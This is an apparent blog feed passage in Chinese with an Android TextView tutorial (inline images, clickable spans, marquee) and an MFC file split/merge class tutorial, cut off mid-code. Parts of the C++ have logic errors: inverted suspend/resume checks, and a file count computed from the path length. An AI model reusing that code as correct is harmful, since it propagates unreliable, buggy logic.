    <content><![CDATA[<h2 id="图文混排"><a href="#图文混排" class="headerlink" title="图文混排"></a>图文混排</h2><p>其实也就是HTML的操作，只不过有一点比较特殊，就是在使用img标签的时候我们需要提供一个接口对象，用来提供我们的图片资源ID，如果资源ID非常非常的多，我们用大量的if语句是非常的麻烦的，而且后期维护性非常的差，所以我们就用到反射的帮助，首先我们构建一个获取资源ID的函数：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">getDrawableResureID</span><span class="params">(String imageName)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalArgumentException, IllegalAccessException</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			Field field = R.drawable<span class="class">.<span class="keyword">class</span>.<span class="title">getField</span>(<span class="title">imageName</span>)</span>;</span><br><span class="line">			<span class="keyword">return</span> Integer.parseInt(field.get(<span class="keyword">null</span>).toString());</span><br><span class="line">		&#125; <span class="keyword">catch</span> (NoSuchFieldError e) &#123;</span><br><span class="line">			<span class="comment">// <span class="doctag">TODO:</span> handle exception</span></span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>这个函数其实就是说提供一个String类型的值，我们通过反射获取类中对应的资源ID。</p>
<p>既然可以这样我们就可以写代码实现img标签的功能了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Tv_One = (TextView) findViewById(R.id.Tv_One);</span><br><span class="line">		String text1 = <span class="string">"&lt;font color = 'blue'&gt;Hello Wker&lt;/font&gt;&lt;img src='ic_l1'/&gt;"</span>;</span><br><span class="line">		text1 += <span class="string">"&lt;font color = 'blue'&gt;Hello Wker1&lt;/font&gt;&lt;img src='ic_l2'/&gt;"</span>;</span><br><span class="line">		text1 += <span class="string">"&lt;font color = 'blue'&gt;Hello Wker2&lt;/font&gt;&lt;img src='ic_l3'/&gt;"</span>;</span><br><span class="line">		CharSequence text =  Html.fromHtml(text1, <span class="keyword">new</span> ImageGetter() &#123;</span><br><span class="line">			</span><br><span class="line">			<span class="meta">@Override</span></span><br><span class="line">			<span class="function"><span class="keyword">public</span> Drawable <span class="title">getDrawable</span><span class="params">(String source)</span> </span>&#123;</span><br><span class="line">				<span class="comment">//根据资源ID获取图片</span></span><br><span class="line">				<span class="keyword">try</span> &#123;</span><br><span class="line">					Drawable drawable = getResources().getDrawable(getDrawableResureID(source));</span><br><span class="line">					drawable.setBounds(<span class="number">0</span>, <span class="number">0</span>, drawable.getIntrinsicWidth(), drawable.getIntrinsicHeight());</span><br><span class="line">					<span class="keyword">return</span> drawable;</span><br><span class="line">				&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">					<span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">					e.printStackTrace();</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;, <span class="keyword">null</span>);</span><br><span class="line">		Tv_One.setText(text);</span><br></pre></td></tr></table></figure>
<p>我们先配置一下HTML标签，居住我们的src要和我们文件的名称一样，因为我们是反射来获取的，R文件的资源就是这样的，获取滞后我们用fromHTML获取CharSequence对象，记得我们用Drawable的时候我哦们还需要设置Drawable的边界，否则会出错，我们可以调节Drawable的宽高实现缩放。<br><img src="img1.jpg" alt="图文混排"><br><img src="img2.jpg" alt="资源名称"></p>
<h2 id="文本跳转"><a href="#文本跳转" class="headerlink" title="文本跳转"></a>文本跳转</h2><p>这个就是不需要HTML的标签我们自己写这个跳转，其实也不是跳转了，就是一个段文本的点击事件：<br>代码片段如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String text = <span class="string">"OK点我打开"</span>;</span><br><span class="line">SpannableString span = <span class="keyword">new</span> SpannableString(text);</span><br><span class="line">span.setSpan(<span class="keyword">new</span> ClickableSpan() &#123;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View widget)</span> </span>&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">		Intent in = <span class="keyword">new</span> Intent(MainActivity.<span class="keyword">this</span>,jmp_class<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">		startActivity(in);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;, <span class="number">2</span>,text.length(),Spanned.SPAN_EXCLUSIVE_EXCLUSIVE );<span class="comment">//SPAN_EXCLUSIVE_EXCLUSIVE这个是不包含前后</span></span><br><span class="line">Tv_One.setText(span);</span><br><span class="line">Tv_One.setMovementMethod(LinkMovementMethod.getInstance());<span class="comment">//响应点击</span></span><br></pre></td></tr></table></figure>
<p>首先先是new一个<code>SpannableString</code>的对象，这个对象的构造方法就是一个文本，然后<code>setSapn</code>方法的第一个参数就是一个点击的对象，这个对象其实中的<code>onClick</code>方法就是当点击指定文本的时候我们响应的时间，这里我们是打开一个Activity，第二三个参数是起始位置和结束为止，在设置文本，然后在确定有响应点击。<br><img src="img3.jpg" alt="实现效果"></p>
<h2 id="跑马灯效果"><a href="#跑马灯效果" class="headerlink" title="跑马灯效果"></a>跑马灯效果</h2><p>其实跑马灯这个效果就是之前写Win32说的那种KTV效果，就是一些字符在这跑动，在安卓中是比较简单的，首先我们添加一个TextView，如下配置：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">TextView</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">"@+id/textView1"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:singleLine</span>=<span class="string">"True"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:ellipsize</span>=<span class="string">"marquee"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:focusable</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:focusableInTouchMode</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:text</span>=<span class="string">"啊啊165461654986啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊"</span> /&gt;</span></span><br></pre></td></tr></table></figure>
<ol>
<li><code>android:singleLine=&quot;True&quot;</code>这个第意思是说TextView是单行的</li>
<li><code>android:ellipsize=&quot;marquee&quot;</code>这个说名他是滚动的，可以设置为前面或者后面啥的三个点</li>
<li><code>android:focusable=&quot;true&quot;</code>这个说明是可以获取焦点的，想一下其实TextView就是一个静态文本，Windows下这个东西是不能获得焦点的。</li>
<li><code>android:focusableInTouchMode=&quot;true&quot;</code>这个说是支持触摸获得焦点的。</li>
</ol>
<p>效果点开就是发现他是跑马灯效果。但是我们知道，只要焦点一消失，我们就不会动了，比如说EditText输入东西我们就不能获取了，那么我们之后自己写一个TextView来让我们的焦点一直存在。</p>
<p>增加两个组件：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">EditText</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">    /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">com.example.android_stduy1.MyTextView</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:id</span>=<span class="string">"@+id/textView2"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:singleLine</span>=<span class="string">"True"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:ellipsize</span>=<span class="string">"marquee"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:text</span>=<span class="string">"啊啊165461654986啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊"</span> /&gt;</span></span><br></pre></td></tr></table></figure>

<p>这个EditText是用来让第一个失去焦点的，下面这个由于我们是强制拥有假的焦点，那么第三四个就不要了，这个时候我们添加一个类：”MyTextView.java”，这个我们自己写一个TextView。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.android_stduy1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.util.AttributeSet;</span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyTextView</span> <span class="keyword">extends</span> <span class="title">TextView</span></span>&#123;</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">MyTextView</span><span class="params">(Context context)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">super</span>(context);</span><br><span class="line">		<span class="comment">// TODO Auto-generated constructor stub</span></span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">MyTextView</span><span class="params">(Context context, AttributeSet attrs)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">super</span>(context, attrs);</span><br><span class="line">		<span class="comment">// TODO Auto-generated constructor stub</span></span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">MyTextView</span><span class="params">(Context context, AttributeSet attrs, <span class="keyword">int</span> defStyle)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">super</span>(context, attrs, defStyle);</span><br><span class="line">		<span class="comment">// TODO Auto-generated constructor stub</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isFocused</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>重写这个类的时候有一点非常注意，我就在这里踩坑了，就是我们的构造函数要写三个，原因具体不清楚，可能是都有可能调用的原因吧，然后我们重写<code>isFocused</code>方法，让他一直都以为有焦点。这个样子我们就可以了，看下效果：<br><img src="img4.gif" alt="实现效果"></p>
]]></content>
      <categories>
        <category>Android学习</category>
      </categories>
      <tags>
        <tag>Android学习</tag>
      </tags>
  </entry>
  <entry>
    <title>文件切割系统</title>
    <url>/2020/02/03/%E6%96%87%E4%BB%B6%E5%88%87%E5%89%B2%E7%B3%BB%E7%BB%9F/</url>
    <content><![CDATA[<h1 id="文件切割系统"><a href="#文件切割系统" class="headerlink" title="文件切割系统"></a>文件切割系统</h1><p>通过这个程序的编写，是一个提升，这段代码提现了明显的Windows程序编写的优点，程序的编写我是参考书籍，虽然书籍有部分出错，但是大体的思想还是非常好的。</p>
<h2 id="程序思想"><a href="#程序思想" class="headerlink" title="程序思想"></a>程序思想</h2><p>首先我们需要了解文件分割合并工具的一个操作流程，分割文件与合并文件其实就是对文件的一个操作（读取创建写入），我们完全可以通过MFC给我们的CFile类。<br>程序流程：我们选择分割单选框的时候，我们供用户一个文件打开通用对话框，我们选择合并单选框的时候我们提供用户一个文件夹选择对话框，让给用户选择一个文件夹，然后合并里面的一些固定文件名称的文件（1__文件.*）。</p>
<p>看下程序操作的一些截图：<br><img src="img1.jpg" alt="选择程序"><br><img src="img2.jpg" alt="分割的文件"><br><img src="img3.jpg" alt="程序运行成功"></p>
<p>这个是简单的分割，其实原理不是太难，而且也是有一定的缺陷，但还是一个很典型的Win32程序。</p>
<p>首先我们需要构造我们这个程序的编写思路，首先我们需要我们之前写好的那个CDirDialog类，传送门：<a href="https://wker666.github.io/2020/01/19/%E9%80%9A%E7%94%A8%E5%AF%B9%E8%AF%9D%E6%A1%86/" target="_blank" rel="noopener" title="通用对话框">https://wker666.github.io/2020/01/19/%E9%80%9A%E7%94%A8%E5%AF%B9%E8%AF%9D%E6%A1%86/</a><br>导入这个类之后，但是直接导入到MFC中是不行的，你会发现重定义，需要将我们的那个头文件和源文件分开写。<br>为了我们后期开发的一个可维护性很高的程序话呢，我感觉适当的“高内聚低耦合”是一个比较重要的一点，所以我们将我们的文件分割操作写到一个类中，正式这个类，完美的提现了Win32编程的巧妙与灵活性。</p>
<h2 id="程序流程"><a href="#程序流程" class="headerlink" title="程序流程"></a>程序流程</h2><p>首先我们重要的CFileCutter类是需要提供一个完整的流程，就是从构造函数一被执行我们就需要开启一个线程，这个线程是类中的一个函数，但是类函数是不能作为线程函数的，这个时候就想到了一个很聪明的做法，那就是类的友元函数，虽然函数的格式固定了，但是友元函数的格式不是固定的，开启线程之后，我们设置一个事件对象，这个事件对象是用来控制线程是否继续的，还有有一点很重要就是我们需要一个关键代码段的对象，因为我们可能在多个地方调用成员变量，所以这个东西也是很关键的一点，并且我们使用<code>PostMessage</code>的方式进行传输我们的消息，这样使我们的接受信息变得不需要有回调函数，程序变得方便了许多。</p>
<h2 id="头文件定义"><a href="#头文件定义" class="headerlink" title="头文件定义"></a>头文件定义</h2><p><code>CFileCutter.h</code>头文件的定义</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __FILECUTTER_H__</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __FILECUTTER_H__</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WM_CUTTERSTART WM_USER+100   <span class="comment">//wParam = nTotalCount</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WM_CUTTERSTOP WM_USER+101    <span class="comment">//wParam = nExitCode ,lParam = nCompletedCount</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WM_CUTTERSTATUS WM_USER+102  <span class="comment">//lParam = nCompletedCount</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CFileCutter</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="keyword">enum</span> ExitCode</span><br><span class="line">	&#123;</span><br><span class="line">		exitSuccess,</span><br><span class="line">		exitUserForce,</span><br><span class="line">		exitSourceErr,</span><br><span class="line">		exitDestErr</span><br><span class="line">	&#125;;</span><br><span class="line">	CFileCutter(HWND hWndNotify);</span><br><span class="line">	<span class="function">BOOL <span class="title">StartSplit</span><span class="params">(LPCTSTR lpszDestDir,LPCTSTR lpszSourceFile,UINT nFileSize)</span></span>;</span><br><span class="line">	<span class="function">BOOL <span class="title">StartMerge</span><span class="params">(LPCTSTR lpszDestDir,LPCTSTR lpszSourceFile)</span></span>;</span><br><span class="line">	<span class="function">BOOL <span class="title">SuspendCutter</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function">BOOL <span class="title">ResumeCutter</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">StopCutter</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function">BOOL <span class="title">IsRunning</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> m_bRunning;&#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	~CFileCutter();</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">Reset</span><span class="params">()</span></span>;<span class="comment">//重置参数信息和状态标志</span></span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">DoSplit</span><span class="params">()</span></span>;<span class="comment">//真正的分割</span></span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">DoMerge</span><span class="params">()</span></span>;<span class="comment">//真正的合并</span></span><br><span class="line">	UINT <span class="keyword">friend</span> _CutterEntry(LPVOID lpParam);<span class="comment">//工作线程</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//参数信息</span></span><br><span class="line">	CString m_strSource;</span><br><span class="line">	CString m_strDest;</span><br><span class="line">	UINT m_uFileSize;</span><br><span class="line">	BOOL m_bSplit;</span><br><span class="line">	<span class="comment">//状态信息</span></span><br><span class="line">	BOOL m_bContinue;</span><br><span class="line">	BOOL m_bRunning;</span><br><span class="line"></span><br><span class="line">	CRITICAL_SECTION m_cs;<span class="comment">//临界区的的一个参定值</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	HWND m_hWndNotify;<span class="comment">//接受信息的窗口句柄</span></span><br><span class="line">	HANDLE m_hWorkEvent;<span class="comment">//通知信息的事件对象句柄</span></span><br><span class="line">	CWinThread * m_pThread;<span class="comment">//工作线程</span></span><br><span class="line">	BOOL m_bSuspend;<span class="comment">//暂停标志</span></span><br><span class="line">	BOOL m_bExitThread;<span class="comment">//退出标志</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span><span class="comment">//__FILECUTTER_H__</span></span></span><br></pre></td></tr></table></figure>
<p>为了防止重定义我们的类，我们需要使用到一些预编译指令。</p>
<ol>
<li>四个参数信息，分别是：源文件，目标文件，是否是分割，每个分割文件的大小</li>
<li>两个状态信息：是否继续，是否在运行</li>
<li>一个参定值：关键代码段</li>
<li>五个受保护的值：窗口句柄（用来接收消息投递的），事件对象，工作线程的一个句柄，是否暂停，是否停止</li>
<li>一个枚举类型：包含了当前状态信息（操作成功，用户强行停止，源文件错误，目标文件错误）</li>
<li>两个真正的操作函数</li>
<li>一个友元线程</li>
<li>一个重置状态信息的函数，用来清空我们的一些操作信息。</li>
<li>两个间接启动的操作线程</li>
<li>三个线程操作函数，分别是暂停，恢复，停止</li>
<li>一个检验是不是在运行的函数</li>
</ol>
<p>看完这些之后，我们对我们的类函数有了一定的了解之后我们就要来编写成员函数了。</p>
<h2 id="类的定义"><a href="#类的定义" class="headerlink" title="类的定义"></a>类的定义</h2><p>首先我们需要包含我们的头文件：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"CFileCutter.h"</span></span></span><br></pre></td></tr></table></figure>
<p><code>stdafx.h</code>这个头文件是要包含的，因为MFC的东西都在里面。<br><code>_CutterEntry</code>这个使我们的线程函数，里面主要是控制着是否分割合并文件的，控制端就是我们的事件对象。具体实现如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">UINT _CutterEntry(LPVOID lParam)</span><br><span class="line">&#123;</span><br><span class="line">	CFileCutter * pCutter = (CFileCutter *)lParam;</span><br><span class="line">	<span class="keyword">while</span>(WaitForSingleObject(pCutter-&gt;m_hWorkEvent,INFINITE) == WAIT_OBJECT_0 &amp;&amp; !pCutter-&gt;m_bExitThread)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//设置状态标志</span></span><br><span class="line">		EnterCriticalSection(&amp;(pCutter-&gt;m_cs));</span><br><span class="line">		pCutter-&gt;m_bRunning = TRUE;</span><br><span class="line">		LeaveCriticalSection(&amp;(pCutter-&gt;m_cs));</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(pCutter-&gt;m_bSplit)</span><br><span class="line">			pCutter-&gt;DoSplit();</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			pCutter-&gt;DoMerge();</span><br><span class="line">		pCutter-&gt;Reset();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先我们接受我们传过来的文件切割对象，强制转换一下，然后用<code>WaitForSingleObject</code>等待我们的事件对象响应，无线等待，并且我们的退出为假。当我们满足了这些要求之后，我们先进入临界区对象，将我们的正在运行设置为真，然后离开（这个真是太仔细了），然后判断是切割还是合并。</p>
<p>然后我们要完成的是构造函数：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">CFileCutter::CFileCutter(HWND hWndNotify)</span><br><span class="line">&#123;</span><br><span class="line">	m_hWndNotify = hWndNotify;</span><br><span class="line">	m_bExitThread = FALSE;</span><br><span class="line">	m_bSuspend  = FALSE;</span><br><span class="line">	m_hWorkEvent = CreateEvent(<span class="literal">NULL</span>,FALSE,FALSE,<span class="literal">NULL</span>);</span><br><span class="line">	m_pThread = ::AfxBeginThread(_CutterEntry,<span class="keyword">this</span>,THREAD_PRIORITY_NORMAL,<span class="number">0</span>,CREATE_SUSPENDED,<span class="literal">NULL</span>);</span><br><span class="line">	m_pThread-&gt;m_bAutoDelete = FALSE;</span><br><span class="line">	m_pThread-&gt;ResumeThread();</span><br><span class="line">	InitializeCriticalSection(&amp;m_cs);</span><br><span class="line">	Reset();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个构造函数是用来初始化我们我们状态信息和启动我们的线程，初始化关键代码段对象的。并且我们需要接受我传递过来的窗口句柄，并重新设置一些信息。<br>然后我们要看我们的<code>Reset()</code>这个可能常用，主要是用来刷新我们参数信息的。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> CFileCutter::Reset()</span><br><span class="line">&#123;</span><br><span class="line">	EnterCriticalSection(&amp;m_cs);</span><br><span class="line">	m_strSource.Empty();</span><br><span class="line">	m_strDest.Empty();</span><br><span class="line">	m_uFileSize = <span class="number">0</span>;</span><br><span class="line">	m_bSplit = TRUE;</span><br><span class="line">	<span class="comment">//重置状态</span></span><br><span class="line">	m_bContinue = TRUE;</span><br><span class="line">	m_bRunning = FALSE;</span><br><span class="line">	LeaveCriticalSection(&amp;m_cs);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>重置一些信息，注意还是要进入关键代码段与离开。</p>
<p>在我们的析构函数中，我们需要清空信息，通知活动线程我们结束了，并且删除我们创建的这些对象。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">CFileCutter::~CFileCutter()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//设置结束标志</span></span><br><span class="line">	m_bExitThread = TRUE;</span><br><span class="line">	EnterCriticalSection(&amp;m_cs);</span><br><span class="line">	m_bContinue = FALSE;</span><br><span class="line">	LeaveCriticalSection(&amp;m_cs);</span><br><span class="line">	SetEvent(m_hWorkEvent);<span class="comment">//防止限制线程等待m_hWorkEvent</span></span><br><span class="line">	WaitForSingleObject(m_pThread-&gt;m_hThread,INFINITE);<span class="comment">//保证线程已经完毕</span></span><br><span class="line">	CloseHandle(m_hWorkEvent);</span><br><span class="line">	DeleteCriticalSection(&amp;m_cs);</span><br><span class="line">	<span class="keyword">delete</span> m_pThread;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先还是先进入关键代码段，设置我们不运行了，要退出，然后告诉我们的线程函数，别等了，我们要结束了，然后等待线程的完毕，关闭事件对象，删除关键代码段，删除线程。</p>
<p>间接切割合并文件的实现：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">BOOL CFileCutter::StartSplit(LPCTSTR lpszDestDir,LPCTSTR lpszSourceFile,UINT nFileSize)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span>(m_bRunning)</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	EnterCriticalSection(&amp;m_cs);</span><br><span class="line">	m_strSource = lpszSourceFile;</span><br><span class="line">	m_strDest = lpszDestDir;</span><br><span class="line">	m_uFileSize = nFileSize;</span><br><span class="line">	m_bSplit = TRUE;</span><br><span class="line">	LeaveCriticalSection(&amp;m_cs);</span><br><span class="line">	SetEvent(m_hWorkEvent);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line">BOOL CFileCutter::StartMerge(LPCTSTR lpszDestDir,LPCTSTR lpszSourceFile)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span>(m_bRunning)</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	EnterCriticalSection(&amp;m_cs);</span><br><span class="line">	m_strSource = lpszSourceFile;</span><br><span class="line">	m_strDest = lpszDestDir;</span><br><span class="line">	m_bSplit = FALSE;</span><br><span class="line">	LeaveCriticalSection(&amp;m_cs);</span><br><span class="line">	SetEvent(m_hWorkEvent);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个就是先判断是不是在运行，然后进关键代码段，然后设置一些信息，然后通知线程该工作了。</p>
<p>再接下来就是我们的一些暂停恢复结束操作了：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">BOOL CFileCutter::SuspendCutter()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span>(m_bRunning)</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	<span class="keyword">if</span>(!m_bSuspend)</span><br><span class="line">	&#123;</span><br><span class="line">		m_pThread-&gt;SuspendThread();</span><br><span class="line">		m_bSuspend = TRUE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line">BOOL CFileCutter::ResumeCutter()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span>(m_bRunning)</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	<span class="keyword">if</span>(!m_bSuspend)</span><br><span class="line">	&#123;</span><br><span class="line">		m_pThread-&gt;ResumeThread();</span><br><span class="line">		m_bSuspend = FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">void</span> CFileCutter::StopCutter()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//设置强制退出标志</span></span><br><span class="line">	EnterCriticalSection(&amp;m_cs);</span><br><span class="line">	m_bContinue = FALSE;</span><br><span class="line">	LeaveCriticalSection(&amp;m_cs);</span><br><span class="line">	ResumeCutter();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>暂停的话呢先判断是不是在运行，然后调用线程的暂停方法，设置成员变量，恢复也是。停止的话呢就是直接将继续这个变量给结束，然后恢复线程。</p>
<p>下面这个是核心代码：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> CFileCutter::DoSplit()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">int</span> nCompleted = <span class="number">0</span>;</span><br><span class="line">	CString strSourceFile = m_strSource;</span><br><span class="line">	CString strDestDir = m_strDest;</span><br><span class="line">	CFile sourceFile,destFile;</span><br><span class="line">	<span class="keyword">if</span> (!sourceFile.Open(strSourceFile,CFile::modeRead | CFile::shareDenyWrite | CFile::typeBinary))<span class="comment">//shareDenyWrite打开文件的时候禁止其他程序进行读写</span></span><br><span class="line">	&#123;</span><br><span class="line">		PostMessage(m_hWndNotify,WM_CUTTERSTOP,exitSourceErr,nCompleted);</span><br><span class="line">		<span class="keyword">return</span> ;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//确保目录的存在，逐级创建文件目录</span></span><br><span class="line">	<span class="keyword">int</span> nPos = <span class="number">-1</span>;</span><br><span class="line">	<span class="keyword">while</span> ((nPos = strDestDir.Find(<span class="string">"\\"</span>,nPos+<span class="number">1</span>)) != <span class="number">-1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		CString str = strDestDir.Left(nPos+<span class="number">1</span>);</span><br><span class="line">		CreateDirectory(str,<span class="literal">NULL</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	CreateDirectory(strDestDir,<span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span>(strDestDir.Right(<span class="number">1</span>) != <span class="string">"\\"</span>)</span><br><span class="line">		strDestDir += <span class="string">"\\"</span>;</span><br><span class="line">	<span class="comment">//通知用户，开始创建文件</span></span><br><span class="line">	<span class="keyword">int</span> nTotalFiles = strSourceFile.GetLength()/m_uFileSize+<span class="number">1</span>;</span><br><span class="line">	PostMessage(m_hWndNotify,WM_CUTTERSTART,nTotalFiles,TRUE);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">int</span> c_page = <span class="number">4</span>*<span class="number">1024</span>;</span><br><span class="line">	<span class="keyword">char</span> Buffer[c_page];</span><br><span class="line">	DWORD dwRead;</span><br><span class="line">	CString sDestName;</span><br><span class="line">	<span class="keyword">int</span> nPreCount = <span class="number">1</span>;</span><br><span class="line">	UINT uWriteBytes;</span><br><span class="line">	<span class="keyword">do</span> </span><br><span class="line">	&#123;</span><br><span class="line">		sDestName.Format(<span class="string">"%d__"</span>,nPreCount);</span><br><span class="line">		sDestName += sourceFile.GetFileName();</span><br><span class="line">		<span 